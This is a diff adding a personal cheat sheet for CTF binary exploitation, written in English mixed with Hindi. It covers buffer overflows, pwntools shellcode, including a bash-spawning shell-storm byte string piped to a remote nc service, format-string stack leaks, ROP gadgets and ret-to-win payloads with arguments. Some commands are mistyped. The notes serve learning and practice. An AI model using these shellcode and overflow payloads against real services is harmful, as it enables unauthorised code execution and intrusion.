@@ -1,0 +1,243 @@
+To Know: in 64 bit architecture RAX, RBX , RIP etc
+         in 32 bit architecture EAX , EBX , EIP etc
+         to get address of libc.so file in local computer => ldd any_binary_file_name_during_ctf_put_the_name_of_given_binary
+         
+         **** p64() , and p32() , do packaging of hex or decimal to bytes string, on the other hand, u64 do unpackaging of bytes string to decimal, 
+                   
+                   example : p64(0x41414141) => b'AAAA\x00\x00\x00\x00' 
+                             u64(b'AAAA\x00\x00\x00\x00') => 1094795585  => which is in decimal , on converting decimal to hex => 41414141
+                             
+                      more correct way to use u64 is to specify 8 bytes and null bytes
+                       u64(b'AAAA\x00\x00\x00\x00'.strip().ljust(8,b'\x00')) => 1094795585
+                                               
+         
+         de Bruijn: de Bruijn sequence of order n on a size-k alphabet A is a cyclic sequence in which every possible length-n string on A occurs exactly once as a substring, we can use this find offsets
+         
+         global offset Table: it contains the addresses of all functions ( printf, scanf, puts ,gets ) inside the libc. The Global Offset Table, or GOT, is a section of a computer program's (executables and shared libraries) memory used to enable computer program code compiled as an ELF file to run correctly, independent of the memory address where the program's code or data is loaded at runtime
+         procedural linkage table: The global offset table converts position-independent address calculations to absolute locations. Similarly the procedure linkage table converts position-independent function calls to absolute locations. The link-editor cannot resolve execution transfers such as function calls between different dynamic objects. So, the link-editor arranges to have the program transfer control to entries in the procedure linkage table. The runtime linker thus redirects the entries without compromising the position-independence and shareability of the program's text. Executable files and shared object files have separate procedure linkage tables.
+
+
+         
+         if you put 0x41 in ipython3 it will print A
+                    
+         to get cyclic string : pwn cyclic 40  
+         
+         "0x0000000000400793" yein ek hex string hai, python mein print krane pr => 0x0000000000400793 aayega
+                    
+                                     but 0x0000000000400793 yein ek hexadecimal integer hai, python mein print krane pr => 4196243 dega , and functions mein bhi 4196243 yahi use krega
+Special bugs ;
+                char variable[112];
+                scanf("%[^\n",variable);  =>  this will read the data and put into variable, until and unless a new line char comes, the buffer allocated is 112 , so if we put more than
+                that buffer overflow happened, and addresses will get overwrite
+                
+##################################################################################fixing binary / patchelf #########################################################################
+
+
+it might possible, while solving ret2libc ctf challenges which comes with their own libc.so.6 file, you are not able to run binary , it will exit with just segmentation fault error,
+this happens because the linker version installed on our computer should be same as the linker installed on ctf server where binary is created. 
+
+to overcome this issue , we need to use two tools 1) pwninit => to download the linker 2) patchelf => to patch binary in a way, so it will always use the downloded linker to run binary, instead of the linker installed on my computer
+
+step 1, put binary and downloaded libc in same directory ,and run : pwninit => it will download the linker ld-2.27.so 
+                                   ===>>>        now we can run the binary with ./ld-2.27.so ./binary
+step 2, patching the binary to use downloaded linker only : patchelf patchelf  --set-interpreter ./ld-2.27.so ./binary  
+
+
+##################################################################################fixing binary / patchelf #########################################################################
+                    
+         
+       * whenever a buffer overflow occur, it will cause a SIGSEGV signal that calls sigsegv_handler, and the handler function will do it jobs, say sigegv_handler function is defined in program, then whenever a buffer overflow happen [ does not necessary program crashes or not ] this function will be called.
+         
+   
+   *************************** checksec **********************************************************
+   
+              PIE : enabled => means we can not perform ROP ( return oriented programming ) attacks, A PIE binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed. This makes Return Oriented Programming (ROP) attacks much more difficult to execute reliably.
+                      
+                      example : say you found a buffer overflow, you found that after putting 72 char , whatever you put it will overwrite the RIP, so you can call any function from this
+                      but the sad case is , if PIE is enabled everytime the program execute, you never know the exact location of function since it is random, so you can not call any function, without its real address.
+                      
+            NX : enabled => means you can not inject shell code  
+
+
+# Pwning payloads :
+####################################################### Creating a pwning server ####################################################################
+            say we have a binary chall , and we want that whenever someone connect to, 127.0.0.1 1234 , this chall will execute to the connecter and a bidirection tcp connection is established so the chall binary can run and data can be transfered , we can do this by using socat
+            
+            => socat socat TCP-LISTEN:5760,reuseaddr,fork EXEC:"./chall"
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+for pwning sometimes we need to do brute force on binary:
+    say we have binary and for number of chars for buffer overflow we want to brute force =>
+    
+        $ for i in range(20..100); do echo $i; python -c "print 'A'*$i " | ./boi
+        
+        in the same way for nc listener
+        
+        $ for i in range(20..100); do echo $i; python -c "print 'A'*$i " | nc domain port
+        
+        in above two commands process will killed after the command executed , if we want process to be alive , then use pwntools of do following command after finding value of i say n
+        
+        $ ( python -c "print 'A'*n" ; cat ) | ./boi
+        
+*******************************************************************We can create our own shell code in asm using pwn tools *******************************************************
+         ######################################## Calling the function
+            ==>> suppose there is a function GET_FLAG in binary at address 0xdeadbeaf , so there are two methods to call that function , use buffer overflow , overwrite the EIP , and 
+            the second method is create own shell code [ getting hex of assembly code to call the function] and just give it to the function
+            
+            
+            Note: here we are not doing buffer overflow , we are doing shell code injection , it is not that much promising , sometimes it work and sometimes not, the purpose is
+            try this whenever the NX is disabled and PIE is enabled. everytime before you do any other attack
+            
+            in our case =>  ipython
+                           > import pwn
+                           > pwn.asm('push 0xdeadbeaf; ret')
+                           'h\xaf\xbe\xad\xde\xc3'
+                           
+                           so , now our payload size must be the less than the size of buffer , since we want to execute our shell code
+                           
+                           put this payload in the argument or input it will call the function , if binary is vulnerable for shell code
+       ############################################## executing command in OS
+       
+         ==>> suppose we have an remote access to nc binary , which taking an input of MAX size 40 bytes , so for that we can create our own shell code using shellcraft, we will read flag.txt file content present in the same directroy
+         
+         in our case: say binary is 32 bit, intel i386 , running on linux os 
+                       => ipython
+                       > import pwn
+                       > pwn.asm(pwn.shellcraft.i386.linux.cat('flag.txt'))
+                       'j\x01\xfe\x0c$h.txthflag\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'
+                       
+                       
+                      
+                       now we have payload , and we need to put this in the binary input , it will list our flag.txt content
+                       
+                      ( python -c "print 'j\x01\xfe\x0c$h.txthflag\x89\xe31\xc9j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'" ;cat ) | nc domain port
+                       
+                       
+        Simple bash shell code => 
+                 => ipython
+                 >import pwn
+                 >pwn.asm(pwn.shellcraft.linux.sh())
+                 
+                 ( python -c "import pwn;print pwn.asm(pwn.shellcraft.linux.sh())"; cat ) | nc domain port
+                       
+                       
+                       
+                       NOTE: Sometimes the shell code created by pwn works and sometimes not, so always try prebuild shell code , check shell-storm site for prebuild shellcodes
+                       http://shell-storm.org/shellcode/
+                       
+                       so in our case we have only 40 BYTES so we need to search shell code whose length is less than 40bytes , we can try for intel 89 arch, payload which will give /bin/bash -p shell to us , 
+                       so we have : http://shell-storm.org/shellcode/files/shellcode-606.php
+                       \x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80 
+                       
+                       we can use this shell code , in such a way so we can hold the terminal
+                       ( python -c "print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'" ; cat ) | nc domain port
+
+
+******************************************************** Format string attack *********************************************************************************
+                       this attack is possible if we did'nt specify the format in printf , scanf, vprintf etc
+                       
+                       print("Your name is %s\n",username)   -> Not vulnerable
+                       print(username)         -> vulnerable
+                       
+                       more read => https://owasp.org/www-community/attacks/Format_string_attack
+                       
+     ###################### leaking stack with format string attack 
+     
+     suppose a binary is asking for input , and after that it is printing the input we have given , but it is directly printing without specifying the format %s or %x etc
+     
+      then we can do exploitation and can leak the values stored in stack.
+      
+      give input as follows :
+      
+      %p -> will print first value stored stack
+      %p %p -> will print two consecutive values
+      %p %p ...... ntimes -> will print n consecutive values stored in stack or registers
+      %8$p  -> will print the 8th value 
+      %6$p -> will print the 6th value
+      
+      Note : sometimes even after sending %p %p %p .... , we will get only one 4 byte hex , which is because their might be a space filter, for that
+            %p__%p__%p__.... n times
+            
+            : basically we are giving format so we can specify format also we can put ascii text ,it will get print as it is and for format %p or anything else, whatever we gave, it will 
+            leak the stack 
+            
+     ###################################################### ROP ( return oriented programming ) #####################################################################
+     
+     ROPgadget : 
+        ROPgadget --binary file_name_binary
+           this will return all avaiable ROP gadget within the binary .., gadget means which will bounce back to their from where it start ( return , ret )
+                       
+         
+         What are ROP gadgets?
+                ROP gadgets are small instruction sequences ending with a “ret” instruction “c3”. Combining these
+                gadgets will enable us to perform certain tasks and in the end conduct our attack as we will see later in
+                this paper.
+                
+    #################################################### Calling function and giving argument #########################################################################
+    
+    say we have a binary , in which there is a hidden function called =>
+                                      void win(long int arg4,unsigned int arg1,unsigned int arg2, unsigned int arg3) {
+                                      // checking values of arguments and printing flag
+                                      if (arg1 != 0xDEADBEEF)
+                                      return;
+                                      if (arg2 != 0xDEADC0DE)
+                                      return;
+                                      if (arg3 != 0x45434241)
+                                      return;
+                                      if (arg4 != 0x100)
+                                      return;
+                                      printf(flag);
+        }
+        
+        now here , if value of any of 4 argument is not as expected by program, then function will just return to next instruction [ the address store just after the address of win function, in the runtime memory allocation ]
+        -->> now we have a discovered a buffer a buffer overflow in main function, which allow us to call this function , 
+        
+        address of win function from -> objdump -d vuln | grep -i "win" => 0x080491e2
+        and we need to put 112 chars to overwrite the next instruction pointer =>
+        
+        steps => 1)first we will send 112 chars to fill the buffer , 
+                 then we will send address of win function so it will get called 
+                 then to pass the first argument which is arg4 as defined very first , we must give 4byte address called as **return address** just after putting the address of win
+                 function,
+                 
+                 ******** return address ******** this address is acutlly the address of function/instruction which should be run after the successful/unsuccessful run of win function,
+                 it means whether the win function run correctly or not, the return address call will be obvious, this function is called at return of win function, this address will be called, and also if we don't want to go anywhere , just put 'AAAA' or any
+                 random string, 
+                 
+                 till now our payload => intital_padding_to_overwrite_next_instruction_pointer + address_of_win + address_of_return_address_of_4bytes_only
+                 
+                 2)now we need to pass the arguments of win function => 
+                              Note , whenever a function call is made, and if function has any arguments, then it will take the arguments from just after 4bytes of its call[ means after 
+                              return_address ] 
+                              
+                 our payload => intital_padding_to_overwrite_next_instruction_pointer + address_of_win + address_of_return_address_of_4bytes_only + arg4 + arg1 + arg2 + arg3
+                   now here in this case =>
+                   
+                   python2 -c "import pwn;print('A'*112 + pwn.p32(0x080491e2)+'BCDE'+pwn.p32(0x100)+pwn.p32(0xDEADBEEF)+pwn.p32(0xDEADC0DE)+pwn.p32(0x45434241))" | ./vuln
+                   
+                   we gave return_address as BCDE , since we don't wish to go anywhere , so after the win function exeution is complete by taking the arguments it will try to execute,
+                   BCDE() but since there is no function , seg fault error will come
+                   
+                 ******************* Now say **********************************************
+                 
+                 there is one more function called as win2
+                  and it is exacly same to same as win , same arguments same order, 
+                  address of win2 function from -> objdump -d vuln | grep -i "win2" => 0x0804928a
+                  now if we put address of win2 in place of return_address of win function, then it will be called after win function,
+                  but since this is same as win function , it will need the same argument, but now ,the next 4bytes will become return address of win2 function and after that it will take its argument, in the size it wants. so , if we want an successful execution of win2 function => 
+                  
+                  
+                  our payload => intital_padding_to_overwrite_next_instruction_pointer + address_of_win + address_of_return_address_of_4bytes_only_which_is_now_win2_address + arg4_whose_first_4Bytes_will_act_as_return_address_of_win2_function_to_fix_this_we_will_put_extra_4bytes_before_this + arg1 + arg2 + arg3
+                  
+                  now we can also put an extra 4bytes after win2 address, so it will take arg4 as it first argument
+                  
+                  payload => python2 -c "import pwn;print('A'*112 + pwn.p32(0x080491e2)+pwn.p32(0x0804928a)+'BCDE'+pwn.p32(0x100)+pwn.p32(0xDEADBEEF)+pwn.p32(0xDEADC0DE)+pwn.p32(0x45434241))" | ./vuln
+                  
+                  flow => 
+                  win function called => return_address = win2 , arg4 = BCDE , arg3 = pwn.p32(0x100) and rest of argument will follow , but this will not print flag, since arg4 condition
+                  is false so it will call return_address
+                  return_address which is win2 => return_address_of_win2 = BCDE ,arg4 = pwn.p32(0x100)and rest of argumet will follow, 
+                  excute successfully and will print the flag
+                  
+                  
+                  
